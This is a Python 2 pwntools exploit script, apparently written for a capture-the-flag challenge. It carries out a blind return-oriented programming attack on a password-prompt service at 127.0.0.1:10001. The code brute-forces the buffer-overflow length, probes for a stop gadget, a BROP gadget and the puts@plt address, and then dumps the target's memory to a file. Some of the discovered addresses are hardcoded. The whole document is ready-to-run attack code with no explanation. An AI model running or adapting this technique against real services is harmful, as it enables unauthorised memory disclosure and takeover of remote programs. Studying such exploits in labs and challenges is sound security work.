from pwn import *
 
ip = '127.0.0.1'
port = 10001
base = 0x400000
 
def find_stop_gadget(size):
    p = log.progress("Searching for Stop gadget ") 

    for offset in range(1,0x1000):
        addr = int(base + offset)
         
        payload = ''
        payload += 'A' * size
        payload += p64(addr)
         
        if offset % 0x100 == 0:
            log.info(" Progressed to 0x%x" % offset)
 
        try:
            r = remote(ip,port,level='error')
            r.recvuntil('WelCome my friend,Do you know password?\n')
            r.send(payload)
            response  = r.recv(timeout=0.2)
            r.close()
 
            if 'WelCome my friend,Do you know password?' in response:
                p.success("Done")
                log.info("Stop address: " +  hex(addr))
                r.close()
                return addr
        except Exception as e:
            r.close()

def check_Overflow():
    for i in range(1,4096):
        try:
            r = remote(ip,port,level='error')
            response = r.recvuntil('WelCome my friend,Do you know password?\n')           
            r.send("A" * i)
            response = r.recv()
            r.close()
            if 'No password, no game' in response:
                i += 1
            else:
                r.close()
                return i
 
        except EOFError as e:
            r.close()
            return i - 1
 
def maybe_BROP_gadget(size, stop_gadget, addr):
    try:
        payload = ''
        payload += 'A' * size 
        payload += p64(addr) 
        payload += p64(0) * 6 
        payload += p64(stop_gadget)

        r = remote(ip,port,level='error')
        r.recvuntil('WelCome my friend,Do you know password?\n')       
        r.sendline(payload)
        response = r.recv(timeout=0.2)

        r.close()
        
        if 'WelCome my friend,Do you know password?' in response:
            return True
        return False

    except Exception as e:
	r.close()
        return False

def is_BROP_gadget(size,addr):
    try:
        payload = ''
        payload += 'A' * size 
        payload += p64(addr) 
        payload += p64(0x41) * 10

        r = remote(ip,port,level='error')
        r.recvuntil('WelCome my friend,Do you know password?\n')
        r.sendline(payload)
        response = r.recv()
        r.close()
        return False

    except Exception as e:
	r.close()
        return True

def find_brop_gadget(size,stop_gadget):
    p = log.progress("Searching for BROP gadget ") 
    for offset in range(0x1,0x1000):
        if offset % 0x100 == 0:
            log.info('Progressed to 0x%x' % offset)

        addr = int(base + offset)
        
        if maybe_BROP_gadget(size,stop_gadget,addr):
            log.info('Maybe BROP Gagget : ' + hex(int(base + offset)))
            if is_BROP_gadget(size, addr):
                p.success("Done")
                log.info('Finded BROP Gagget : ' + hex(int(base + offset)))
                return addr

def find_puts_addr(size,stop_gadget,rdi_ret):
    p = log.progress("Searching for the address of puts@plt") 
    for offset in range(1,0x1000):
        addr = int(base + offset)

        payload = ''
        payload += 'A' * size + p64(rdi_ret) 
        payload += p64(0x400000) 
        payload += p64(addr) 
        payload += p64(stop_gadget)

        if offset % 0x100 == 0:
            log.info('Progressed to 0x%x' % offset)

        r = remote(ip,port,level='error')
        r.recvuntil('WelCome my friend,Do you know password?\n')
        r.sendline(payload)
        try:
            response = r.recv()
            if response.startswith('\x7fELF'):
                p.success("Done")
                log.success('find puts@plt addr: 0x%x' % addr)
                return addr
            r.close()
            addr += 1
        except Exception as e:
            r.close()
            addr += 1

def memory_dump(size,stop_gadget,rdi_ret,put_plt):
    now = base
    end = 0x401000
    dump = ""
 
    p = log.progress("Memory dump") 
    while now < end:
        if now % 0x100 == 0:
            log.info("Progressed to  0x%x" % now)
 
        payload = ''
        payload += 'A' * size
        payload += p64(rdi_ret)
        payload += p64(now)
        payload += p64(puts_plt)
        payload += p64(stop_gadget)
 
        r = remote(ip,port,level='error')
        r.recvuntil('WelCome my friend,Do you know password?\n')
        r.sendline(payload)
        try:
            data = r.recv(timeout=0.5)
            r.close()
 
            data = data[:data.index("\nWelCome")]           
        except ValueError as e:
            data = data
        except Exception as e:
            continue
         
        if len(data.split()) == 0:
            data = '\x00'
 
        dump += data
        now += len(data)
         
    
    with open('memory.dump','wb') as f:
        f.write(dump)

    p.success("Done")

size = check_Overflow()
log.info('Overflow size : ' + str(size))

#Find stop gadget
#stop_gadget = find_stop_gadget(size)
stop_gadget = 0x4005c0

#Find BROP gadget
#brop_gadget = find_brop_gadget(size, stop_gadget)
brop_gadget = 0x4007ba
log.success('BROP Gadget : ' + hex(brop_gadget))
rdi_gadget = brop_gadget + 9
log.success('RDI Gadget : ' +hex(rdi_gadget))

#Find puts addr
#puts_plt = find_puts_addr(size,stop_gadget,rdi_gadget)
puts_plt = 0x400555
log.success('Puts plt : ' + hex(puts_plt))

memory_dump(size,stop_gadget,rdi_gadget,puts_plt)
